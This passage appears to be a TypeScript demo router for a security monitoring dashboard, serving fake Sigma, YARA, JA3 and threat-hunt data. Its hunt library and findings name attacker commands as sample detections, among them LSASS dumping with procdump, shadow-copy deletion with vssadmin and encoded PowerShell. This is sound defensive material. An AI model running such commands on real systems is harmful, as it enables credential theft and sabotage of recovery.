// Static demo router — returns baked-in data for every API endpoint.
// Used by app/api/[...path]/route.ts when DEMO_ONLY=true.
// No backend or database required; deploys to Netlify free tier.

import RAW from './data.json';

const D = RAW as Record<string, any[]>;

// ── helpers ──────────────────────────────────────────────────────────────────

function paginate(arr: any[], sp: URLSearchParams) {
  const page    = Math.max(1, parseInt(sp.get('page')     || '1'));
  const perPage = Math.min(200, Math.max(1, parseInt(sp.get('per_page') || '50')));
  const total   = arr.length;
  const pages   = Math.ceil(total / perPage);
  const slice   = arr.slice((page - 1) * perPage, page * perPage);
  return { data: slice, page, per_page: perPage, total, pages };
}

function ok(data: unknown, status = 200) { return { data, status }; }
function notFound()  { return { data: { error: 'not found' }, status: 404 }; }
function demoBlock() { return { data: { error: 'Action disabled in demo mode' }, status: 403 }; }

// Seeded LCG — stable values without Math.random() non-determinism
function seededRand(seed: number) {
  return ((seed * 1664525 + 1013904223) & 0xffffffff) / 0x100000000 + 0.5;
}

// ── Pre-computed blobs (built once, reused on every request) ─────────────────

// SigmaRuleStat[] — one entry per rule (page does stats.map(s => [s.rule_id, s]))
const SIGMA_STATS = D.sigma_rules.map((r: any, i: number) => ({
  rule_id:         r.id,
  title:           r.title,
  hit_count:       r.match_count ?? Math.floor(seededRand(r.id) * 50),
  last_matched_at: i < 80 ? new Date(Date.now() - i * 3600000).toISOString() : null,
}));

// Sigma enterprise demo blobs
const _sigmaRules: any[] = D.sigma_rules ?? [];
const _sigmaEnabled = _sigmaRules.filter((r: any) => r.enabled).length;
const _sigmaSevCounts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
_sigmaRules.forEach((r: any) => { const k = r.severity as keyof typeof _sigmaSevCounts; if (k in _sigmaSevCounts) _sigmaSevCounts[k]++; });
const _sigmaTactics = [...new Set(_sigmaRules.map((r: any) => r.mitre_tactic).filter(Boolean))];
const _sigmaTechs   = [...new Set(_sigmaRules.map((r: any) => r.mitre_technique).filter(Boolean))];

const SIGMA_DASHBOARD = {
  total: _sigmaRules.length,
  enabled: _sigmaEnabled,
  disabled: _sigmaRules.length - _sigmaEnabled,
  severity: _sigmaSevCounts,
  status: { experimental: Math.floor(_sigmaRules.length * 0.6), stable: Math.floor(_sigmaRules.length * 0.3), testing: Math.floor(_sigmaRules.length * 0.1) },
  triggered_24h: Math.min(Math.floor(_sigmaRules.length * 0.3), 40),
  triggered_7d:  Math.min(Math.floor(_sigmaRules.length * 0.6), 80),
  total_hits_24h: 247,
  mitre_tactics: _sigmaTactics.length,
  mitre_techniques: _sigmaTechs.length,
  top_rules: _sigmaRules.slice(0, 8).map((r: any, i: number) => ({
    id: r.id, title: r.title, severity: r.severity,
    hits_7d: Math.max(50 - i * 6, 1), hits_24h: Math.max(12 - i, 0),
  })),
  trend: Array.from({ length: 14 }, (_, i) => ({
    date: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10),
    count: 10 + Math.floor(seededRand(i + 100) * 40),
  })),
  categories: [
    { category: 'windows',  total: Math.floor(_sigmaRules.length * 0.4), enabled: Math.floor(_sigmaRules.length * 0.35) },
    { category: 'linux',    total: Math.floor(_sigmaRules.length * 0.2), enabled: Math.floor(_sigmaRules.length * 0.18) },
    { category: 'network',  total: Math.floor(_sigmaRules.length * 0.15), enabled: Math.floor(_sigmaRules.length * 0.1) },
    { category: 'cloud',    total: Math.floor(_sigmaRules.length * 0.1), enabled: Math.floor(_sigmaRules.length * 0.08) },
    { category: 'unknown',  total: Math.floor(_sigmaRules.length * 0.15), enabled: Math.floor(_sigmaRules.length * 0.1) },
  ],
};

const _tacticMap: Record<string, { technique: string; name: string; rules: number; enabled: number }[]> = {};
_sigmaRules.forEach((r: any) => {
  if (!r.mitre_tactic || !r.mitre_technique) return;
  if (!_tacticMap[r.mitre_tactic]) _tacticMap[r.mitre_tactic] = [];
  const existing = _tacticMap[r.mitre_tactic].find((t: any) => t.technique === r.mitre_technique);
  if (existing) { existing.rules++; if (r.enabled) existing.enabled++; }
  else _tacticMap[r.mitre_tactic].push({ technique: r.mitre_technique, name: r.mitre_name || r.mitre_technique, rules: 1, enabled: r.enabled ? 1 : 0 });
});
const SIGMA_MITRE_COVERAGE = {
  coverage: Object.entries(_tacticMap).map(([tactic, techniques]) => ({
    tactic, techniques, total_rules: techniques.reduce((s: number, t: any) => s + t.rules, 0),
  })),
  uncovered: _sigmaRules.filter((r: any) => !r.mitre_tactic).length,
};

const SIGMA_ANALYTICS = {
  rules: _sigmaRules.slice(0, 50).map((r: any, i: number) => ({
    id: r.id, title: r.title, severity: r.severity, mitre_tactic: r.mitre_tactic || '',
    enabled: r.enabled, hit_count: Math.max(100 - i * 2, 0),
    hits_24h: Math.max(12 - i, 0), hits_7d: Math.max(50 - i * 1, 0),
    last_hit: i < 30 ? new Date(Date.now() - i * 7200000).toISOString() : null,
  })),
  daily: Array.from({ length: 30 }, (_, i) => ({
    date: new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
    hits: 5 + Math.floor(seededRand(i + 200) * 60), rules: 3 + Math.floor(seededRand(i + 300) * 15),
  })),
  sev_hits: [
    { severity: 'critical', hits: 89 }, { severity: 'high', hits: 312 },
    { severity: 'medium', hits: 541 }, { severity: 'low', hits: 203 },
  ],
};

const SIGMA_CATEGORIES = {
  categories: [
    { platform: 'windows', category: 'process_creation', total: 45, enabled: 40, hits_7d: 312 },
    { platform: 'windows', category: 'network_connection', total: 18, enabled: 15, hits_7d: 87 },
    { platform: 'windows', category: 'registry_event', total: 12, enabled: 10, hits_7d: 43 },
    { platform: 'linux',   category: 'process_creation', total: 22, enabled: 20, hits_7d: 156 },
    { platform: 'linux',   category: 'auditd', total: 8, enabled: 7, hits_7d: 29 },
    { platform: 'network', category: 'general', total: 15, enabled: 12, hits_7d: 201 },
    { platform: 'cloud',   category: 'aws', total: 10, enabled: 8, hits_7d: 34 },
    { platform: 'unknown', category: 'general', total: 20, enabled: 14, hits_7d: 0 },
  ],
};

const SIGMA_RELATIONSHIPS = {
  nodes: [
    ..._sigmaRules.slice(0, 8).map((r: any) => ({ id: `rule_${r.id}`, label: r.title.slice(0, 18), type: 'rule', value: 10 })),
    { id: 'agent_1', label: 'WIN10-CORP', type: 'agent', value: 8 },
    { id: 'agent_2', label: 'LINUX-SRV1', type: 'agent', value: 5 },
    { id: 'agent_3', label: 'DC01', type: 'agent', value: 12 },
    ..._sigmaTechs.slice(0, 5).map((t: string) => ({ id: `mitre_${t}`, label: t, type: 'mitre', value: 1 })),
  ],
  edges: [
    ..._sigmaRules.slice(0, 8).map((r: any, i: number) => ({ source: `rule_${r.id}`, target: `agent_${(i % 3) + 1}`, weight: 5 - i })),
    ..._sigmaRules.slice(0, 5).map((r: any, i: number) => ({ source: `rule_${r.id}`, target: `mitre_${_sigmaTechs[i % _sigmaTechs.length]}`, weight: 1 })),
  ],
};

// ── YARA enterprise demo blobs ────────────────────────────────────────────

const _yaraRules: any[]   = D.yara_rules   ?? [];
const _yaraMatches: any[] = D.yara_matches  ?? [];
const _yaraEnabled = _yaraRules.filter((r: any) => r.enabled !== false).length;

const _yaraSevCounts: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
_yaraMatches.forEach((m: any) => { const k = m.severity as string; if (k in _yaraSevCounts) _yaraSevCounts[k]++; });

const _yaraTopRules: Record<string, { matches: number; matches_24h: number; severity: string }> = {};
_yaraMatches.forEach((m: any, i: number) => {
  if (!_yaraTopRules[m.rule_name]) _yaraTopRules[m.rule_name] = { matches: 0, matches_24h: 0, severity: m.severity ?? 'medium' };
  _yaraTopRules[m.rule_name].matches++;
  if (i < 20) _yaraTopRules[m.rule_name].matches_24h++;
});

const YARA_DASHBOARD = {
  total:           _yaraRules.length,
  enabled:         _yaraEnabled,
  disabled:        _yaraRules.length - _yaraEnabled,
  matches_today:   Math.min(_yaraMatches.length, 12),
  matches_week:    _yaraMatches.length,
  matches_total:   _yaraMatches.length,
  files_detected:  Math.floor(_yaraMatches.length * 0.8),
  agents_triggered: [...new Set(_yaraMatches.map((m: any) => m.agent_id))].length,
  sev_breakdown: Object.entries(_yaraSevCounts).filter(([, c]) => c > 0).map(([severity, count]) => ({ severity, count })),
  top_rules: Object.entries(_yaraTopRules).sort((a, b) => b[1].matches - a[1].matches).slice(0, 8)
    .map(([rule_name, v]) => ({ rule_name, ...v })),
  trend: Array.from({ length: 14 }, (_, i) => ({
    date:  new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10),
    count: Math.floor(seededRand(i + 400) * 15),
  })),
  recent_matches: _yaraMatches.slice(0, 8).map((m: any) => ({
    rule_name:  m.rule_name,
    file_path:  m.file_path,
    severity:   m.severity,
    agent_id:   m.agent_id,
    created_at: m.created_at ?? new Date(Date.now() - Math.floor(seededRand(m.id ?? 1) * 86400000)).toISOString(),
  })),
};

const YARA_ANALYTICS = {
  rules: _yaraRules.slice(0, 50).map((r: any, i: number) => ({
    rule_name:    r.name,
    total:        Math.max(30 - i * 2, 0),
    last_7d:      Math.max(12 - i, 0),
    last_24h:     Math.max(4 - i, 0),
    last_match:   i < 20 ? new Date(Date.now() - i * 7200000).toISOString() : null,
    top_severity: r.rule_content?.includes('critical') ? 'critical' : r.rule_content?.includes('high') ? 'high' : 'medium',
  })),
  daily: Array.from({ length: 30 }, (_, i) => ({
    date:  new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
    count: Math.floor(seededRand(i + 500) * 12),
  })),
  top_agents: D.agents.map((a: any, i: number) => ({
    agent_id:   a.id,
    agent_name: a.hostname,
    matches:    Math.max(20 - i * 5, 0),
  })).filter((a: any) => a.matches > 0),
};

const _YARA_FAMILIES = ['ransomware', 'trojan', 'backdoor', 'webshell', 'miner', 'rootkit', 'packer', 'generic'];
const YARA_CATEGORIES = {
  categories: _YARA_FAMILIES.map((cat, i) => {
    const catRules = _yaraRules.filter((_: any, ri: number) => ri % _YARA_FAMILIES.length === i);
    return {
      category: cat,
      total:    Math.max(catRules.length, 1),
      enabled:  Math.max(catRules.filter((r: any) => r.enabled !== false).length, 1),
      rules: catRules.map((r: any) => ({ id: r.id, name: r.name, enabled: r.enabled !== false })),
    };
  }),
};

const YARA_RELATIONSHIPS = {
  nodes: [
    ..._yaraRules.slice(0, 8).map((r: any) => ({ id: `rule_${r.id}`, label: r.name.slice(0, 18), type: 'rule', value: 6 })),
    ...D.agents.map((a: any) => ({ id: `agent_${a.id}`, label: a.hostname.slice(0, 14), type: 'agent', value: 8 })),
    ...['malware_x.exe', 'svchost_fake.exe', 'wscript.exe', 'packed.bin'].map((f, i) => ({ id: `file_${i}`, label: f, type: 'file', value: 4 })),
  ],
  edges: [
    ..._yaraRules.slice(0, 8).map((r: any, i: number) => ({ source: `rule_${r.id}`, target: `agent_${D.agents[i % D.agents.length]?.id ?? 1}`, weight: 5 - i })),
    ..._yaraMatches.slice(0, 4).map((_: any, i: number) => ({ source: `rule_${_yaraRules[i % _yaraRules.length]?.id ?? 1}`, target: `file_${i % 4}`, weight: 3 })),
  ],
};

// FleetAnomalySummary[] — one entry per agent
const FLEET_SUMMARIES = D.agents.map((a: any, i: number) => ({
  agent_id:    a.id,
  hostname:    a.hostname,
  peak_score:  [82, 67, 44, 31][i] ?? 40,
  avg_score:   [71, 55, 38, 28][i] ?? 35,
  readings:    120,
  last_scored: new Date(Date.now() - i * 900000).toISOString(),
}));

// IOCs with indicator/enabled fields (page reads .indicator and .enabled)
const IOCS_NORMALIZED = D.iocs.map((ioc: any) => ({
  ...ioc,
  indicator: ioc.indicator ?? ioc.value,
  enabled:   ioc.enabled   ?? ioc.active ?? true,
}));

// Insider threat with correct contributor keys
const INSIDER_NORMALIZED = D.insider_threat.map((s: any) => ({
  ...s,
  contributors: {
    off_hours_auth:     s.contributors?.off_hours_auth ?? s.contributors?.off_hours     ?? Math.floor(seededRand(s.id * 6)     * 12),
    failed_auth:        s.contributors?.failed_auth    ?? s.contributors?.failed_logins ?? Math.floor(seededRand(s.id * 6 + 1) * 10),
    data_exfil:         s.contributors?.data_exfil     ?? s.contributors?.data_access   ?? Math.floor(seededRand(s.id * 6 + 2) * 18),
    sensitive_access:   s.contributors?.sensitive_access                                ?? Math.floor(seededRand(s.id * 6 + 3) * 8),
    privesc_attempt:    s.contributors?.privesc_attempt                                 ?? Math.floor(seededRand(s.id * 6 + 4) * 5),
    anomalous_location: s.contributors?.anomalous_location                              ?? Math.floor(seededRand(s.id * 6 + 5) * 6),
  },
}));

// Threat actors with required display fields
const THREAT_ACTORS_NORMALIZED = D.threat_actors.map((a: any, i: number) => ({
  ...a,
  recent_alert_count: [3, 7, 1, 0, 2, 5, 0, 1, 4, 0][i] ?? 0,
  is_builtin:         i < 6,
}));

// JA3 fingerprints with is_platform
const JA3_NORMALIZED = D.ja3.map((j: any, i: number) => ({
  ...j,
  is_platform: i < 2,
}));

// ── JA3 Enterprise demo blobs ─────────────────────────────────────────────

const _ja3: any[]    = D.ja3 ?? [];
const _ja3Alerts     = D.alerts.filter((a: any) => a.mitre_technique === 'T1071.001');

const JA3_DASHBOARD = {
  total:           _ja3.length,
  platform_count:  2,
  tenant_count:    Math.max(_ja3.length - 2, 0),
  critical_count:  _ja3.filter((j: any) => j.severity === 'critical').length,
  new_today:       0,
  alerts_24h:      _ja3Alerts.length,
  alerts_7d:       _ja3Alerts.length,
  agents_hit_24h:  [...new Set(_ja3Alerts.map((a: any) => a.agent_id))].length,
  high_risk_sessions: _ja3Alerts.length,
  top_fingerprints: _ja3.map((j: any, i: number) => ({
    hash:        j.hash,
    threat_name: j.threat_name,
    severity:    j.severity,
    source:      j.source,
    hit_count:   Math.max(20 - i * 5, 0),
  })),
  trend: Array.from({ length: 14 }, (_, i) => ({
    date:  new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10),
    count: Math.floor(seededRand(i + 700) * 8),
  })),
  sev_breakdown: [
    { severity: 'critical', count: _ja3.filter((j: any) => j.severity === 'critical').length },
    { severity: 'high',     count: _ja3.filter((j: any) => j.severity === 'high').length },
    { severity: 'medium',   count: _ja3.filter((j: any) => j.severity === 'medium').length },
  ].filter(s => s.count > 0),
};

const JA3_ANALYTICS = {
  fingerprints: _ja3.map((j: any, i: number) => ({
    hash:        j.hash,
    threat_name: j.threat_name,
    severity:    j.severity,
    source:      j.source,
    total:       Math.max(20 - i * 4, 0),
    last_24h:    Math.max(5 - i, 0),
    last_7d:     Math.max(12 - i * 2, 0),
    last_match:  i < 3 ? new Date(Date.now() - i * 7200000).toISOString() : null,
    agents_hit:  Math.max(2 - i, 0),
  })),
  daily: Array.from({ length: 30 }, (_, i) => ({
    date:  new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
    count: Math.floor(seededRand(i + 800) * 6),
  })),
  top_agents: D.agents.map((a: any, i: number) => ({
    agent_id:   a.id,
    hostname:   a.hostname,
    hits:       Math.max(8 - i * 2, 0),
  })).filter((a: any) => a.hits > 0),
};

const JA3_TLS_STATS = {
  tls_versions: [
    { version: 'TLSv1.3', count: 1247 },
    { version: 'TLSv1.2', count: 834 },
    { version: 'TLSv1.1', count: 12 },
    { version: 'TLSv1.0', count: 5 },
  ],
  ciphers: [
    { cipher: 'TLS_AES_256_GCM_SHA384',     count: 756,  is_weak: false },
    { cipher: 'TLS_CHACHA20_POLY1305_SHA256',count: 491,  is_weak: false },
    { cipher: 'TLS_AES_128_GCM_SHA256',     count: 312,  is_weak: false },
    { cipher: 'TLS_RSA_WITH_3DES_EDE_CBC_SHA',count: 8,  is_weak: true  },
    { cipher: 'TLS_RSA_WITH_RC4_128_SHA',   count: 3,    is_weak: true  },
  ],
  self_signed:   4,
  expired_certs: 2,
  invalid_certs: 1,
  unique_ja3:    _ja3.length,
  unique_ja3s:   Math.max(_ja3.length - 1, 0),
};

const JA3_BEHAVIORAL = {
  beaconing: _ja3Alerts.length > 0 ? [
    { agent_id: D.agents[0]?.id ?? 1, hostname: D.agents[0]?.hostname ?? 'web-prod-01',
      alert_count: 12, first_seen: new Date(Date.now() - 3600000 * 6).toISOString(),
      last_seen: new Date(Date.now() - 1800000).toISOString(), rule_name: 'Malicious TLS Fingerprint: Cobalt Strike Default' },
  ] : [],
  rare: _ja3.filter((_: any, i: number) => i >= 2).map((j: any) => ({
    hash: j.hash, threat_name: j.threat_name, severity: j.severity, hit_count: 0,
  })),
  new: [],
};

const JA3_THREAT_INTEL = {
  malware_families: [
    { family: 'Cobalt Strike', confidence: 95, hash: 'a0e9f5d64349fb13191bc781f81f42e1',
      evidence: 'Default Malleable C2 profile with 769 cipher suite; widely documented in threat intel', mitre: 'T1071.001',
      actor: 'Various APT groups (Lazarus, APT41, FIN7)', reports: ['CrowdStrike CS-C2 Intel', 'Recorded Future'], category: 'C2 Framework', in_blocklist: true },
    { family: 'Metasploit', confidence: 90, hash: '6734f37431670b3ab4292b8f60f29984',
      evidence: 'Metasploit Meterpreter HTTPS stager — unique cipher ordering', mitre: 'T1059.001',
      actor: 'Multiple threat actors', reports: ['Salesforce JA3 Research', 'Sslbl.abuse.ch'], category: 'Exploitation Framework', in_blocklist: true },
    { family: 'Sliver C2', confidence: 80, hash: '473cd7cb9faa642487833865d516e578',
      evidence: 'Sliver C2 framework default HTTPS beacon fingerprint', mitre: 'T1071.001',
      actor: 'State-sponsored actors', reports: ['BishopFox Sliver Analysis'], category: 'C2 Framework', in_blocklist: false },
    { family: 'PowerShell Empire', confidence: 75, hash: 'a17b458f85ff9b1e2c9f7c30bc44e90b',
      evidence: 'Python requests library fingerprint in specific Empire config', mitre: 'T1059.001',
      actor: 'FIN10, APT28', reports: ['BC-Security Empire Docs'], category: 'C2 Framework', in_blocklist: false },
    { family: 'RedLine Stealer', confidence: 85, hash: '0bab3f08a8a8a8f1815a42a1f4ff2a1a',
      evidence: 'RedLine infostealer TLS via WinHTTP characteristic cipher ordering', mitre: 'T1041',
      actor: 'Underground criminals', reports: ['CISA AA22-264A'], category: 'Infostealer', in_blocklist: false },
    { family: 'TrickBot', confidence: 70, hash: '72a589da586844d7f0818ce684948eea',
      evidence: 'TrickBot banking trojan HTTPS C2 using modified OpenSSL fingerprint', mitre: 'T1071.001',
      actor: 'Wizard Spider', reports: ['Palo Alto Unit 42'], category: 'Banking Trojan', in_blocklist: false },
  ],
  recent_hits: _ja3Alerts.slice(0, 8).map((a: any) => {
    const ag = D.agents.find((ag: any) => ag.id === a.agent_id);
    return { rule_name: a.rule_name, severity: a.severity, created_at: a.created_at, hostname: ag?.hostname ?? `Agent #${a.agent_id}` };
  }),
};

const JA3_RELATIONSHIPS = {
  nodes: [
    ..._ja3.slice(0, 4).map((j: any) => ({ id: 'ja3_' + j.hash.slice(0, 8), label: j.threat_name.slice(0, 18), type: 'ja3', value: j.severity === 'critical' ? 12 : 6 })),
    ...D.agents.map((a: any) => ({ id: `agent_${a.id}`, label: a.hostname, type: 'agent', value: 6 })),
    { id: 'ip_185_220_101', label: '185.220.101.47', type: 'ip', value: 8 },
    { id: 'ip_45_33_32',    label: '45.33.32.156',  type: 'ip', value: 4 },
  ],
  edges: [
    ..._ja3.slice(0, 4).map((j: any, i: number) => ({ source: `agent_${D.agents[i % D.agents.length]?.id ?? 1}`, target: 'ja3_' + j.hash.slice(0, 8), weight: 4 - i })),
    { source: `agent_${D.agents[0]?.id ?? 1}`, target: 'ip_185_220_101', weight: 5 },
    { source: `agent_${D.agents[1]?.id ?? 2}`, target: 'ip_45_33_32',    weight: 2 },
  ],
};

const JA3_TIMELINE = {
  fingerprints: _ja3.map((j: any, i: number) => ({
    hash:          j.hash,
    threat_name:   j.threat_name,
    severity:      j.severity,
    first_added:   j.created_at ?? new Date(Date.now() - 86400000 * 30).toISOString(),
    first_match:   i < 2 ? new Date(Date.now() - 86400000 * 7).toISOString() : null,
    last_match:    i < 2 ? new Date(Date.now() - 3600000).toISOString() : null,
    total_matches: Math.max(20 - i * 5, 0),
  })),
  daily: Array.from({ length: 30 }, (_, i) => ({
    date:  new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
    count: Math.floor(seededRand(i + 900) * 6),
  })),
};

// Correlation rules mapped to the interface the page expects
const CORRELATION_RULES_NORMALIZED = D.correlation_rules.map((r: any) => ({
  ...r,
  rule_name:        r.rule_name   ?? r.name,
  action:           r.action      ?? 'create_incident',
  source_type:      r.source_type ?? 'alert',
  agent_id:         r.agent_id    ?? 0,
  condition_value:  r.condition_value ?? String(r.threshold ?? ''),
  playbook_id:      r.playbook_id ?? null,
  stages:           r.stages      ?? null,
}));

// Hunt templates with display fields
const HUNT_TEMPLATES_NORMALIZED = D.hunt_templates.map((t: any) => ({
  ...t,
  schedule:    t.schedule    ?? null,
  created_by:  t.created_by  ?? 'XCloak',
}));

// ── Threat Hunt Enterprise demo data ─────────────────────────────────────────

const THREAT_HUNT_LIBRARY: any[] = [
  { id: 1, name: 'PowerShell Encoded Command Hunt',       category: 'ttp',    sub_category: 'powershell',     author: 'analyst-1', priority: 'high',     status: 'active',    risk_level: 'high',     mitre_techniques: 'T1059.001', hypothesis: 'An attacker may have used PowerShell with encoded commands after phishing to establish persistence.', objective: 'Find encoded PowerShell invocations across all endpoints', expected_findings: 'powershell.exe -EncodedCommand events', success_criteria: 'Identify hosts with encoded PS execution not tied to legitimate software', scope: 'endpoints,servers', query_type: 'process', query_text: 'powershell', schedule_type: 'daily', cron_schedule: '0 6 * * *', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-1', review_status: 'approved', hit_count: 14, run_count: 8, success_count: 6, false_positive_count: 2, success_rate: 75, last_run_at: new Date(Date.now() - 3600000).toISOString(), version: 3, created_at: new Date(Date.now() - 86400000 * 7).toISOString() },
  { id: 2, name: 'APT29 Phishing Infrastructure Hunt',   category: 'actor',  sub_category: 'apt29',          author: 'analyst-2', priority: 'critical', status: 'active',    risk_level: 'critical', mitre_techniques: 'T1566,T1071.001,T1059.001', hypothesis: 'APT29 may be using phishing domains for initial access against our external-facing users.', objective: 'Identify connections to known APT29 C2 infrastructure', expected_findings: 'DNS queries and HTTP connections to APT29 domains', success_criteria: 'Find hosts connecting to indicators from APT29 campaign reports', scope: 'endpoints,network,cloud', query_type: 'connection', query_text: 'beacon', schedule_type: 'weekly', cron_schedule: '0 8 * * 1', is_continuous: true, continuous_interval: '4h', assigned_analyst: 'analyst-2', review_status: 'approved', hit_count: 3, run_count: 4, success_count: 2, false_positive_count: 1, success_rate: 50, last_run_at: new Date(Date.now() - 7200000).toISOString(), version: 2, created_at: new Date(Date.now() - 86400000 * 14).toISOString() },
  { id: 3, name: 'LSASS Memory Dumping Detection',       category: 'ttp',    sub_category: 'lsass',          author: 'analyst-1', priority: 'critical', status: 'active',    risk_level: 'critical', mitre_techniques: 'T1003.001', hypothesis: 'Attackers may be dumping LSASS to harvest credentials post-compromise.', objective: 'Find LSASS memory access events indicative of credential dumping', expected_findings: 'procdump.exe or comsvcs.dll MiniDump access to lsass.exe', success_criteria: 'Alert on any unauthorized LSASS handle requests', scope: 'endpoints,servers', query_type: 'process', query_text: 'lsass', schedule_type: 'continuous', cron_schedule: '', is_continuous: true, continuous_interval: '1h', assigned_analyst: 'analyst-1', review_status: 'approved', hit_count: 2, run_count: 12, success_count: 2, false_positive_count: 0, success_rate: 100, last_run_at: new Date(Date.now() - 1800000).toISOString(), version: 4, created_at: new Date(Date.now() - 86400000 * 21).toISOString() },
  { id: 4, name: 'Cobalt Strike Beacon Hunt',            category: 'malware', sub_category: 'cobalt_strike', author: 'analyst-3', priority: 'critical', status: 'active',    risk_level: 'critical', mitre_techniques: 'T1071.001,T1573,T1055', hypothesis: 'Cobalt Strike beacons may be present in the environment based on threat intel feeds.', objective: 'Identify Cobalt Strike C2 communication patterns', expected_findings: 'Periodic beaconing to known Cobalt Strike domains, JA3 fingerprint matches', success_criteria: 'Find hosts with beacon sleep patterns and encrypted C2 comms', scope: 'endpoints,network', query_type: 'connection', query_text: 'beacon', schedule_type: 'daily', cron_schedule: '0 */4 * * *', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-3', review_status: 'approved', hit_count: 5, run_count: 6, success_count: 4, false_positive_count: 1, success_rate: 66.7, last_run_at: new Date(Date.now() - 5400000).toISOString(), version: 2, created_at: new Date(Date.now() - 86400000 * 5).toISOString() },
  { id: 5, name: 'AWS IAM Privilege Escalation Hunt',    category: 'cloud',  sub_category: 'aws_iam',        author: 'analyst-2', priority: 'high',     status: 'active',    risk_level: 'high',     mitre_techniques: 'T1078,T1548', hypothesis: 'An insider or compromised identity may be abusing IAM roles to escalate privileges.', objective: 'Detect unusual IAM role assumption and policy modification', expected_findings: 'CreatePolicy, AttachRolePolicy events from unexpected sources', success_criteria: 'Identify any non-approved IAM changes in the last 30 days', scope: 'cloud', query_type: 'log', query_text: 'iam', schedule_type: 'daily', cron_schedule: '0 9 * * *', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-2', review_status: 'pending', hit_count: 7, run_count: 5, success_count: 3, false_positive_count: 4, success_rate: 60, last_run_at: new Date(Date.now() - 9000000).toISOString(), version: 1, created_at: new Date(Date.now() - 86400000 * 3).toISOString() },
  { id: 6, name: 'Data Exfiltration via DNS Tunneling', category: 'insider', sub_category: 'data_exfil',    author: 'analyst-1', priority: 'high',     status: 'completed', risk_level: 'high',     mitre_techniques: 'T1048.003', hypothesis: 'An insider threat actor may be exfiltrating data via DNS tunneling to evade DLP.', objective: 'Detect anomalous DNS query volumes and long TXT/NULL record queries', expected_findings: 'DNS queries with >50 chars subdomain, high volume to single domain', success_criteria: 'Find hosts with DNS tunneling indicators not tied to legitimate tools', scope: 'endpoints,network,dns', query_type: 'connection', query_text: 'dns', schedule_type: 'manual', cron_schedule: '', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-3', review_status: 'approved', hit_count: 1, run_count: 3, success_count: 1, false_positive_count: 2, success_rate: 33.3, last_run_at: new Date(Date.now() - 86400000 * 2).toISOString(), version: 2, created_at: new Date(Date.now() - 86400000 * 10).toISOString() },
  { id: 7, name: 'Lateral Movement via SMB Shares',     category: 'ttp',    sub_category: 'lateral',        author: 'analyst-2', priority: 'high',     status: 'active',    risk_level: 'high',     mitre_techniques: 'T1021.002,T1550', hypothesis: 'Post-compromise lateral movement may be occurring via admin SMB shares with stolen credentials.', objective: 'Detect admin share access patterns inconsistent with normal IT operations', expected_findings: 'Authentication events to C$, ADMIN$ from unexpected source hosts', success_criteria: 'Identify source hosts accessing >3 unique admin shares in <1h', scope: 'endpoints,servers,active_directory', query_type: 'alert', query_text: 'smb', schedule_type: 'continuous', cron_schedule: '', is_continuous: true, continuous_interval: '2h', assigned_analyst: 'analyst-1', review_status: 'approved', hit_count: 8, run_count: 10, success_count: 7, false_positive_count: 1, success_rate: 70, last_run_at: new Date(Date.now() - 3600000 * 2).toISOString(), version: 5, created_at: new Date(Date.now() - 86400000 * 30).toISOString() },
  { id: 8, name: 'Ransomware Pre-Stage Hunt',           category: 'malware', sub_category: 'ransomware_family', author: 'analyst-3', priority: 'critical', status: 'active', risk_level: 'critical', mitre_techniques: 'T1486,T1490,T1489', hypothesis: 'A ransomware operator may be staging for deployment — shadow copy deletion and network drive enumeration are indicators.', objective: 'Detect pre-ransomware staging activities', expected_findings: 'vssadmin delete shadows, net use, taskkill /f service kills', success_criteria: 'Alert on any VSS deletion or shadow inhibition events', scope: 'endpoints,servers', query_type: 'log', query_text: 'vssadmin', schedule_type: 'continuous', cron_schedule: '', is_continuous: true, continuous_interval: '30m', assigned_analyst: 'analyst-2', review_status: 'approved', hit_count: 0, run_count: 15, success_count: 0, false_positive_count: 0, success_rate: 0, last_run_at: new Date(Date.now() - 1800000).toISOString(), version: 3, created_at: new Date(Date.now() - 86400000 * 45).toISOString() },
];

const THREAT_HUNT_FINDINGS_DATA: any[] = [
  { id: 1, hunt_id: 1, hunt_name: 'PowerShell Encoded Command Hunt', severity: 'high',     confidence: 'high',   risk: 'high',   title: 'Encoded PowerShell on WORKSTATION-01', description: 'powershell.exe -EncodedCommand SQBFAFgAIA...', mitre_technique: 'T1059.001', affected_host: 'WORKSTATION-01', affected_user: 'jdoe', ioc_value: 'powershell -enc', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() },
  { id: 2, hunt_id: 3, hunt_name: 'LSASS Memory Dumping Detection', severity: 'critical', confidence: 'high',   risk: 'critical', title: 'LSASS Dumped via procdump on SRV-02', description: 'procdump64.exe -ma lsass.exe dump.dmp detected', mitre_technique: 'T1003.001', affected_host: 'SRV-02', affected_user: 'SYSTEM', ioc_value: 'procdump', status: 'confirmed', created_at: new Date(Date.now() - 7200000).toISOString() },
  { id: 3, hunt_id: 4, hunt_name: 'Cobalt Strike Beacon Hunt', severity: 'critical', confidence: 'medium', risk: 'critical', title: 'Beacon sleep pattern on WORKSTATION-04', description: 'Regular 60s HTTP POST to non-standard port, fixed payload size', mitre_technique: 'T1071.001', affected_host: 'WORKSTATION-04', affected_user: 'bsmith', ioc_value: '185.220.101.47', status: 'open', created_at: new Date(Date.now() - 5400000).toISOString() },
  { id: 4, hunt_id: 2, hunt_name: 'APT29 Phishing Infrastructure Hunt', severity: 'high', confidence: 'medium', risk: 'high', title: 'APT29-linked domain access from LAP-012', description: 'DNS query to known APT29 phishing domain detected', mitre_technique: 'T1566', affected_host: 'LAP-012', affected_user: 'mwilson', ioc_value: 'cozy-update.net', status: 'acknowledged', created_at: new Date(Date.now() - 9000000).toISOString() },
